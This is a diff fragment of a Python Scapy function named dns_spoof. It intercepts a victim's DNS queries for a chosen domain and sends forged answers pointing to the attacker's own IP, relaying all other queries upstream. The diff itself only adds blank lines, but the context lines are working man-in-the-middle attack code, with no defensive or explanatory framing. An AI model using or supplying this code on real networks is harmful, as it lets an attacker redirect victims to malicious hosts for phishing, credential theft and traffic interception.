@@ -12,6 +12,7 @@ def dns_spoof(pkt, target_ip, target_mac, local_ip, interface, domain, dns_serve
     clean_domain = domain.replace("http://", "").replace("https://", "").rstrip("/")
 
     if qname == clean_domain or qname.endswith("." + clean_domain):
+        
         print(f"Intercepted DNS query for {qname}. Sending spoofed answer ({local_ip}).")
         forged = (
             Ether(dst=target_mac, src=get_if_hwaddr(interface)) /
@@ -25,18 +26,21 @@ def dns_spoof(pkt, target_ip, target_mac, local_ip, interface, domain, dns_serve
                 an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=local_ip),
             )
         )
+
         sendp(forged, iface=interface, verbose=0)
     else:
         try:
             upstream_query = IP(dst=dns_server) / UDP(dport=53, sport=pkt[UDP].sport) / pkt[DNS]
             reply = sr1(upstream_query, timeout=timeout, verbose=0)
             if reply and reply.haslayer(DNS):
+                
                 relay = (
                     Ether(dst=target_mac, src=get_if_hwaddr(interface)) /
                     IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                     UDP(dport=pkt[UDP].sport, sport=53) /
                     reply[DNS]
                 )
+
                 sendp(relay, iface=interface, verbose=0)
         except Exception as exc:
             print(f"Could not relay DNS query for {qname}: {exc}")
